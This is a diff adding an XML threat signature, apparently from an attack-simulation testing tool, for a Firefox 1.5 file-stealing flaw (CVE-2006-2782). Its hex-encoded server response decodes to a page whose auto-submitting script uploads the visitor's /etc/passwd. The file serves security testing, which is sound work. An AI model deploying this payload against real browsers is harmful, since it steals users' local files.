@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Firefox File Stealing"/>
+    <EngDesc display="true" value="This threat attempts to steal a file off of a client computer via a malicious webpage.  This is an attack from the virtual server.  Web servers typically listen on port 80."/>
+    <Intent display="true">
+      <item value="Implementation_Exploitation"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Mozilla"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Mozilla_Firefox"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Mozilla_Firefox_1.5.0.2"/>
+      <item value="Mozilla_Firefox_1.5.0.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.mozilla.org/security/announce/2006/mfsa2006-41.html"/>
+    <CVEID display="true" value="CVE-2006-2782"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID value="0000010bacad4c2f00c000a80001003c344fe0c4" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.7"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="local"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632850950268360000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1149653306" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="">
+      <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A204D6F6E2C203035204A756E20323030362031323A34383A303120474D540D0A5365727665723A204170616368652F322E302E353420284665646F7261290D0A4C6173742D4D6F6469666965643A204D6F6E2C203035204A756E20323030362031323A34323A313820474D540D0A455461673A20223164656530312D3139612D3736663737653830220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203431300D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D5554462D380D0A0D0A3C48544D4C3E0A3C484541443E0A3C7363726970743E0A66756E6374696F6E206368616E67652829207B0A646F63756D656E742E676574456C656D656E74427949642827636875636B66696C6527292E747970653D27627574746F6E273B0A646F63756D656E742E676574456C656D656E74427949642827636875636B66696C6527292E747970653D2766696C65273B0A7D0A3C2F7363726970743E0A3C2F484541443E0A3C424F4459206F6E6C6F61643D226368616E676528293B646F63756D656E742E676574456C656D656E7442794964282761666F726D27292E7375626D697428293B223E0A3C464F524D2069643D2261666F726D2220656E63747970653D226D756C7469706172742F666F726D2D646174612220414354494F4E3D2275706C6F6164686572652E70687022204D4554484F443D22504F5354223E0A3C494E5055542069643D22636875636B66696C652220747970653D227465787422206E616D653D2266696C6534636875636B222076616C75653D222F6574632F70617373776422202F3E0A3C2F464F524D3E0A3C2F48544D4C3E0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
